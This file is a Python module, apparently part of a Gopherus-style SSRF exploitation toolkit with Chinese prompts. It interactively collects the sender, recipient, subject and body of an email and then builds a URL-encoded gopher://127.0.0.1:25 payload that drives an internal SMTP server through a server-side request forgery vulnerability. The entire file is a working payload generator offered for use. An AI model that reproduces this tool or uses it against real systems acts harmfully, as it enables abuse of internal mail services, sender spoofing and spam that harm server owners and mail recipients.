import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def SMTP():
    print_banner("SMTP SSRF 利用")

    print_step(1, "配置发件信息")
    print_info("输入发件人邮箱地址")
    mailfrom = input(c("  > 发件人: ", CYAN))
    while not mailfrom:
        print(c("  [x] 发件人不能为空", RED))
        mailfrom = input(c("  > 发件人: ", CYAN))

    print_step(2, "配置收件信息")
    print_info("输入收件人邮箱地址")
    mailto = input(c("  > 收件人: ", CYAN))
    while not mailto:
        print(c("  [x] 收件人不能为空", RED))
        mailto = input(c("  > 收件人: ", CYAN))

    print_step(3, "配置邮件内容")
    print_info("输入邮件主题")
    subject = input(c("  > 主题: ", CYAN))
    if not subject:
        subject = "Test"
        print_info(f"使用默认主题: {subject}")

    print_info("输入邮件内容")
    msg = input(c("  > 内容: ", CYAN))
    if not msg:
        msg = "Hello from SSRF"
        print_info(f"使用默认内容: {msg}")

    commands = [
        f"MAIL FROM:{mailfrom}",
        f"RCPT To:{mailto}",
        "DATA",
        f"From:{mailfrom}",
        f"Subject:{subject}",
        f"Message:{msg}",
        ".",
    ]

    payload = "%0A".join(commands)
    finalpayload = (
        urllib.parse.quote_plus(payload)
        .replace("+", "%20")
        .replace("%2F", "/")
        .replace("%25", "%")
        .replace("%3A", ":")
    )

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(f"gopher://127.0.0.1:25/_{finalpayload}", UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success(f"邮件将从 {mailfrom} 发送到 {mailto}")

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
